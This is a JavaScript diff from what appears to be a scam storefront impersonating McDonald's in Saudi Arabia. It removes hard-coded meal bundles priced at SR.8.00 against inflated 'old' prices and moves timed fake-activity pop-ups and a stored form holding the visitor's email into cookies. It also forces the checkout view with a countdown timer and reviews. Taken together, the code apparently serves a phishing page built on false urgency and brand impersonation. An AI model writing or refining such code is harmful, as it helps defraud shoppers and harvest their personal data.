@@ -150,30 +150,6 @@ const changeProductInfo = () => {
   mainProductOldPrice.innerText = mainProduct.oldPrice;
   mainProductNewPrice.innerText = mainProduct.newPrice;
 
-
-
-  if (localStorage.getItem("__selected_product") === "26468782") {
-    mainProductName.innerText = "Pack Duo";
-    mainProductOldPrice.innerText = "SR.98.99";
-    mainProductNewPrice.innerText = "SR.8.00";
-    mainProductText.innerHTML =
-      "McMenú® وجبة بيج ماك McMenú® وجبة ماك تشيكن ٢ ماك فلوري أوريو®";
-  } else if (localStorage.getItem("__selected_product") === "26468783") {
-    mainProductName.innerText = "Pack Trio";
-    mainProductOldPrice.innerText = "SR.129.00";
-    mainProductNewPrice.innerText = "SR.8.00";
-    mainProductText.innerHTML =
-      "٢ McMenú® وجبة بيج ماك ١ McMenú® وجبة ماك تشيكن ٢٥ قطعة تشيكن ماك ناجتس";
-  } else if (localStorage.getItem("__selected_product") === "26468784") {
-    mainProductName.innerText = "Pack Family";
-    mainProductOldPrice.innerText = "SR.107.40";
-    mainProductNewPrice.innerText = "SR.8.00";
-    mainProductText.innerHTML =
-      "McMenú® وجبة بيج ماك McMenú® وجبة ماك تشيكن وجبة هابي ميل ٩ قطع تشيكن ماك ناجتس";
-  }
-
-
-
 };
 
 const productVariantsInit = () => {
@@ -476,18 +452,18 @@ const notificationsInit = () => {
       }, 1400);
     }, 5e3);
   };
-  if (localStorage.getItem("__notification_1") == null) {
+  if (getCookie("__notification_1") == null) {
     setTimeout(() => {
       showNotify(notifications[0]);
       hideNotify();
-      localStorage.setItem("__notification_1", "true");
+      setCookie("__notification_1", "true");
     }, 15e3);
   }
-  if (localStorage.getItem("__notification_2") == null) {
+  if (getCookie("__notification_2") == null) {
     setTimeout(() => {
       showNotify(notifications[1]);
       hideNotify();
-      localStorage.setItem("__notification_2", "true");
+      setCookie("__notification_2", "true");
     }, 25e3);
   }
 };
@@ -540,12 +516,16 @@ const mainInit = () => {
 };
 
 setTimeout(() => {
-  if (localStorage.getItem("__is_checkout") != null) {
+  // if (getCookie("__is_checkout") != null) {
+  if (true) {
     // if (true) {
     openCheckout();
     checkoutInit();
     notificationsInit();
     timerInit();
+    modalStartInit();
+    ratingInit();
+    reviewsInit();
   } else {
     openMain();
     // mainInit();
@@ -553,7 +533,6 @@ setTimeout(() => {
     // questionsInit();
     ratingInit();
     reviewsInit();
-    modalStartInit();
     // notificationsInit();
   }
   disableLoader();
@@ -629,7 +608,7 @@ window.onload = () => {
       // ['cityField', city],`
       ['emailField', email]];
 
-      localStorage.setItem('filled_form', JSON.stringify(arr));
+      setCookie('filled_form', JSON.stringify(arr));
 
       // Update the href attribute of the redirect link
       // redirectLinkElement.href = constructedLink;
